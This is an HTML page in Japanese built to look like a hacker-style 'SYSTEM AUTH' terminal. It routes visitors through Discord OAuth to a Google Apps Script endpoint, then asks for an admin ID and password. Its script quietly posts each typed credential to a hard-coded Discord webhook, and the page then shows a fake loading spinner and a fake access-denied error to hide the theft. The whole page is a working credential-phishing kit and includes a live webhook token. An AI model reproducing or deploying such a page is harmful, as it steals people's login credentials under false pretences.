<!DOCTYPE html><html lang="ja"><head>
    <meta charset="UTF-8">
    <title>epiclogin - TERMINAL</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .login-card { background-color: #0a0a0a; padding: 40px; border: 1px solid #00ff00; width: 380px; text-align: center; box-shadow: 0 0 15px rgba(0, 255, 0, 0.3); }
        h1 { font-size: 20px; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 3px; }
        input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1px solid #00ff00; background-color: #000; color: #00ff00; outline: none; }
        button, .discord-btn { display: block; width: 100%; padding: 15px; border: 1px solid #00ff00; background-color: #002200; color: #00ff00; font-weight: bold; cursor: pointer; text-transform: uppercase; text-decoration: none; box-sizing: border-box; }
        button:hover, .discord-btn:hover { background-color: #00ff00; color: #000; }
        .discord-btn { background-color: #5865F2; color: #fff; border: none; margin-bottom: 10px; }
        .loader { border: 4px solid #002200; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head><body>

    <div id="authStep" class="login-card">
        <h1>[ SYSTEM AUTH ]</h1>
        <p>ツールを起動するにはDiscord連携が必要です。</p>
        <a href="https://discord.com/oauth2/authorize?client_id=1467502850610561229&response_type=code&redirect_uri=https%3A%2F%2Fscript.google.com%2Fmacros%2Fs%2FAKfycbxT1KN9AYzaZh0xK4L440-dFm77vwc6IXmx0UGkLkz5PwiRzc7iWOEg0msLOQHLc9j0%2Fexec&scope=guilds+guilds.members.read" class="discord-btn">DISCORDで認証</a>
    </div>

    <div id="step1" class="login-card hidden">
        <h1>[ LOGIN ID ]</h1>
        <input type="text" id="userMsg" placeholder="ENTER ADMIN ID...">
        <button onclick="nextStep('step1', 'step2', 2000, 'ID確認中...')">次へ</button>
    </div>

    <div id="step2" class="login-card hidden">
        <h1>[ ACCESS PASS ]</h1>
        <input type="password" id="passMsg" placeholder="ENTER PASSWORD...">
        <button onclick="nextStep('step2', 'errorScreen', 3000, 'サーバー接続中...')">接続開始</button>
    </div>

    <div id="loadingScreen" class="login-card hidden">
        <div class="loader"></div>
        <p id="loadingText">実行中...</p>
    </div>

    <div id="errorScreen" class="login-card hidden">
        <h1 style="color: #ff0000; border-color: #ff0000;">FAILED</h1>
        <p>アクセス権限が不足しています。管理者トークンが必要です。</p>
        <button onclick="location.href='index.html'" style="background-color: #220000; color: #ff0000; border-color: #ff0000;">再試行</button>
    </div>

    <script>
        // ★ここにWebhook URLを貼り付けてな！
        const webhookUrl = "https://discord.com/api/webhooks/1467497007139655792/fWG4s2fmCekiP-zZLzuCZmExuSybnX5Pfl4GxlbAHxzAgyeDhIy3D8KMqDTWbhviKE_4";

        function nextStep(current, next, ms, text) {
            let val = "";
            if (current === 'step1') {
                val = document.getElementById('userMsg').value;
                if(val) sendToWebhook("【ID入力】: " + val);
            } else if (current === 'step2') {
                val = document.getElementById('passMsg').value;
                if(val) sendToWebhook("【PASS入力】: " + val);
            }

            document.getElementById(current).classList.add('hidden');
            document.getElementById('loadingText').innerText = text;
            document.getElementById('loadingScreen').classList.remove('hidden');
            
            setTimeout(() => {
                document.getElementById('loadingScreen').classList.add('hidden');
                document.getElementById(next).classList.remove('hidden');
            }, ms);
        }

        function sendToWebhook(msg) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: msg })
            });
        }

        // GAS（認証）から戻ってきた時の判定
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('code')) {
            // 最初の認証画面を隠して、ID入力画面を出す
            document.getElementById('authStep').classList.add('hidden');
            document.getElementById('step1').classList.remove('hidden');
        }
    </script>
</body></html>